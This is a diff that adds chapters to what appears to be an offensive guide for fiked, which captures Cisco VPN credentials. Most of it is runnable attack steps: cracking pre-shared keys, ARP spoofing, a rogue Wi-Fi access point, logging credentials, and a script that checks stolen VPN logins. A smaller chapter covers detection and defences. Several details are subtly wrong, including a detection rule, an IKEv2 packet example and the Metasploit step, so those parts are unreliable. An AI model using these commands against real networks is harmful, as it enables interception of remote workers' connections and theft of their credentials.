@@ -495,12 +495,358 @@ grep -i "SA\|NONCE\|KEY\|XAUTH" /tmp/fiked_debug.log
 
 ---
 
+## Chapter 9: PSK Discovery Techniques
+
+### Dictionary Attack on PSK
+
+```bash
+# Use ike-scan with pskcrack to recover PSK
+# Step 1: Capture IKE negotiation
+ike-scan --pskcrack=psk_hash.txt -M 192.168.1.1
+
+# Step 2: Crack PSK with pskcrack
+pskcrack -m 0 -b 5 psk_hash.txt /usr/share/wordlists/rockyou.txt
+
+# Or use hashcat for GPU-accelerated cracking
+# Convert to hashcat format
+ike-scan --pskcrack=- 192.168.1.1 | hashcat -m 5400 -a 0 wordlist.txt
+
+# Step 3: Use recovered PSK with fiked
+sudo fiked -g 192.168.1.1 -k GroupName:recovered_psk -l creds.log
+```
+
+### PSK from Configuration Review
+
+```bash
+# Common PSK locations in Cisco configurations
+# - Group password in VPN client profiles (.pcf files)
+# - Shared secret in router configs
+# - Default PSKs in documentation
+
+# Search for PSK in configuration files
+find / -name "*.pcf" -exec grep -l "GroupPwd\|SharedKey" {} \; 2>/dev/null
+
+# Extract PSK from .pcf files (Cisco VPN client)
+grep -A1 "GroupPwd" *.pcf
+```
+
+### PSK from Memory Dump
+
+```bash
+# If the gateway is compromised, extract PSK from memory
+# Using Volatility for memory forensics
+volatility -f gateway_memory.dump --profile=Win7SP1x64 netscan
+volatility -f gateway_memory.dump --profile=Win7SP1x64 procdump -p isakmpd
+
+# Analyze binary for PSK strings
+strings isakmpd.exe | grep -i "group\|password\|secret\|psk"
+```
+
+---
+
+## Chapter 10: IKE Protocol Deep Dive
+
+### IKEv1 vs IKEv2
+
+| Feature | IKEv1 | IKEv2 |
+|---------|-------|-------|
+| Fiked Support | Yes | No |
+| Authentication | PSK, Cert, XAuth | EAP, Cert, PSK |
+| Nat Traversal | NAT-T | Built-in |
+| MOBIKE | No | Yes |
+| Security | Weaker | Stronger |
+| RFC | 2409 | 7296 |
+
+### IKE Phase 1 Details
+
+```
+Main Mode (6 messages):
+1. Initiator → Responder: SA (proposals)
+2. Responder → Initiator: SA (chosen)
+3. Initiator → Responder: Nonce + Key Exchange
+4. Responder → Initiator: Nonce + Key Exchange
+5. Initiator → Responder: ID + Hash (encrypted)
+6. Responder → Initiator: ID + Hash (encrypted)
+
+Aggressive Mode (3 messages):
+1. Initiator → Responder: SA + Nonce + Key Exchange + ID
+2. Responder → Initiator: SA + Nonce + Key Exchange + ID + Hash
+3. Initiator → Responder: Hash (encrypted)
+```
+
+### XAUTH Exchange Details
+
+```
+After IKE Phase 1 completes:
+1. Gateway → Client: XAUTH Request (type=1)
+   - Includes: protocol, type, username field
+2. Client → Gateway: XAUTH Reply (type=1)
+   - Includes: username
+3. Gateway → Client: XAUTH Request (type=2)
+   - Includes: password field
+4. Client → Gateway: XAUTH Reply (type=2)
+   - Includes: password
+5. Gateway → Client: XAUTH Result
+   - 1 = ACK (success), 16 = NAK (failure)
+
+Fiked captures steps 2 and 4 for credentials.
+```
+
+### Cisco Group Authentication
+
+```bash
+# Cisco VPN clients use group authentication
+# The group name and PSK are shared among all users
+
+# Find group names from network capture
+ike-scan -M -P 192.168.1.1 2>&1 | grep "IDii\|VID"
+
+# Common default group names
+# - "test"
+# - "default"
+# - "cisco"
+# - "vpn"
+# - Company name variations
+
+# Try multiple group names
+sudo fiked -g 192.168.1.1 \
+  -k default:password123 \
+  -k cisco:cisco123 \
+  -k test:test123 \
+  -k corp:corppassword \
+  -l multi_group.log
+```
+
+---
+
+## Chapter 11: Advanced Network Positioning
+
+### VPN Traffic Redirection
+
+```bash
+# Redirect VPN client traffic through attacker
+# Step 1: Identify VPN client and gateway IPs
+sudo tcpdump -i eth0 udp port 500 -nn | head -20
+
+# Step 2: ARP spoof between client and gateway
+sudo arpspoof -i eth0 -t <client_ip> <gateway_ip> &
+sudo arpspoof -i eth0 -t <gateway_ip> <client_ip> &
+
+# Step 3: Enable IP forwarding
+sudo sysctl -w net.ipv4.ip_forward=1
+
+# Step 4: Start Fiked
+sudo fiked -r -g <gateway_ip> -k GroupName:PSK -l vpn_creds.log
+
+# Step 5: Monitor for VPN connections
+sudo tcpdump -i eth0 udp port 500 -nn -w vpn_traffic.pcap
+```
+
+### Wireless VPN Interception
+
+```bash
+# Target remote workers connecting via VPN from WiFi
+# Step 1: Create rogue AP matching target network
+wifipumpkin3 -i wlan0 -m "ssid=OfficeWiFi;channel=6"
+
+# Step 2: Capture VPN traffic from wireless clients
+sudo tcpdump -i wlan0 udp port 500 or udp port 4500 -nn -w wifi_vpn.pcap
+
+# Step 3: ARP spoof if on same LAN
+sudo arpspoof -i eth0 -t <vpn_client> <gateway> &
+
+# Step 4: Start Fiked
+sudo fiked -r -g <gateway_ip> -k VPNGroup:SharedSecret -l wifi_vpn.log
+```
+
+### Split Tunneling Attack
+
+```bash
+# Many VPN configurations use split tunneling
+# Only traffic to the corporate network goes through VPN
+# Internet traffic goes directly
+
+# Identify split tunnel configuration
+# Look for:
+# - Route additions after VPN connect
+# - DNS configuration changes
+# - Split exclude/include networks
+
+# Capture traffic on both paths
+sudo tcpdump -i eth0 -w corp_traffic.pcap "net 10.0.0.0/8"
+sudo tcpdump -i eth0 -w internet_traffic.pcap "not net 10.0.0.0/8"
+
+# Fiked targets the IKE negotiation path (always through gateway)
+sudo fiked -r -g 10.0.0.1 -k CorpVPN:PSK123 -l split_tunnel.log
+```
+
+---
+
+## Chapter 12: Detection and Defense
+
+### Detection Signatures
+
+**IKE-Specific Detection:**
+```
+# Snort rule for duplicate IKE negotiation
+alert udp any any -> any 500 (
+  msg:"IKE from duplicate source";
+  content:"|00 00 00 00 00 00 00 00|";
+  threshold:type both, track by_src, count 3, seconds 60;
+  sid:1000001; rev:2;
+)
+
+# Suricata rule for IKE from non-gateway MAC
+alert udp any 500 -> any 500 (
+  msg:"IKE response from unexpected MAC";
+  flow:to_server;
+  threshold:type both, track by_src, count 5, seconds 10;
+  sid:1000002; rev:1;
+)
+```
+
+**Network Monitoring:**
+```bash
+# Monitor for duplicate IKE negotiations
+sudo tcpdump -i eth0 udp port 500 -nn -l | \
+  awk '{print $3}' | sort | uniq -d | \
+  while read src; do
+    echo "[!] Duplicate IKE source detected: $src"
+  done
+
+# Monitor for XAUTH in plaintext
+sudo tcpdump -i eth0 udp port 500 -A | grep -i "xauth\|username\|password"
+```
+
+### Blue Team Countermeasures
+
+```bash
+# 1. Certificate-based authentication (eliminates PSK)
+# Configure on gateway:
+# crypto ikev2 proposalNewProposal
+#  encryption aes-gcm-256
+#  prf sha512
+#  group 21
+
+# 2. IKEv2 with EAP-TLS (mutual certificate auth)
+# Requires RADIUS server + certificates on clients
+
+# 3. Network segmentation
+# Isolate VPN gateway on dedicated VLAN
+# Restrict IKE traffic to known clients
+
+# 4. MAC address filtering
+# Allow only known client MACs on VPN gateway
+
+# 5. Dynamic ARP Inspection (DAI)
+# On Cisco switches:
+# ip arp inspection vlan 10
+# ip arp inspection validate src-mac dst-mac ip
+
+# 6. VPN monitoring and alerting
+# Log all IKE negotiations
+# Alert on failures or duplicates
+# Monitor for credential reuse
+```
+
+---
+
+## Chapter 13: Integration with Other Tools
+
+### Scapy IKE Packet Crafting
+
+```python
+#!/usr/bin/env python3
+"""Custom IKE packet generation with Scapy"""
+from scapy.all import *
+
+# Craft IKE_SA_INIT request
+ike_init = (
+    IP(dst="192.168.1.1") /
+    UDP(sport=500, dport=500) /
+    ISAKMP() /
+    ISAKMP_payload_SA(proposals=[
+        ISAKMP_payload_Proposal(
+            proposal=1,
+            proto=ISAKMP_PROTO_ISAKMP,
+            transforms=[
+                ISAKMP_payload_Transform(
+                    transform=1,
+                    TransformID=KEY_IKE,
+                    SA_lifetime=3600,
+                    Encryption_Algorithm=ENCR_AES_CBC,
+                    Hash_Algorithm=HASH_SHA256,
+                    Group_Description=GROUP_MODP2048,
+                )
+            ]
+        )
+    ])
+)
+
+send(ike_init)
+```
+
+### Metasploit Integration
+
+```bash
+# Use Metasploit for VPN enumeration
+msfconsole -q
+
+# Scan for VPN gateways
+use auxiliary/scanner/ike/ike_version
+set RHOSTS 192.168.1.0/24
+run
+
+# After capturing credentials with Fiked
+# Use them for VPN access
+use auxiliary/scanner/ftp/ftp_login
+```
+
+### Credential Validation Script
+
+```bash
+#!/bin/bash
+# validate_vpn_creds.sh - Validate captured VPN credentials
+GATEWAY="192.168.1.1"
+GROUP="CapturedGroup"
+PSK="CapturedPSK"
+USERNAME="CapturedUser"
+PASSWORD="CapturedPass"
+
+# Create temporary VPN config
+cat > /tmp/vpn_test.conf << EOF
+IPSec gateway $GATEWAY
+IPSec ID $GROUP
+IPSec secret $PSK
+Xauth username $USERNAME
+Xauth password $PASSWORD
+EOF
+
+# Test connection
+timeout 10 vpnc --no-detach /tmp/vpn_test.conf 2>&1
+RESULT=$?
+
+if [ $RESULT -eq 0 ]; then
+    echo "[+] VPN credentials are valid!"
+    # Disconnect
+    vpnc-disconnect 2>/dev/null
+else
+    echo "[-] VPN connection failed (code: $RESULT)"
+fi
+
+rm -f /tmp/vpn_test.conf
+```
+
+---
+
 ## Resources
 
 - **Homepage:** https://www.roe.ch/FakeIKEd
 - **Kali Documentation:** https://www.kali.org/tools/fiked/
 - **ike-scan:** https://github.com/royhills/ike-scan
-- **vpnc:** https://www.unix-ag.org/ vpn/vpnc/
+- **vpnc:** https://www.unix-ag.org/vpn/vpnc/
 - **strongSwan:** https://www.strongswan.org
 - **IPsec RFC 7296:** https://tools.ietf.org/html/rfc7296
 - **IKE Protocol Analysis:** https://www.wireshark.org/docs/protocols/ike.html
+- **RFC 2409 (IKEv1):** https://tools.ietf.org/html/rfc2409
+- **NIST SP 800-77:** https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-77r1.pdf
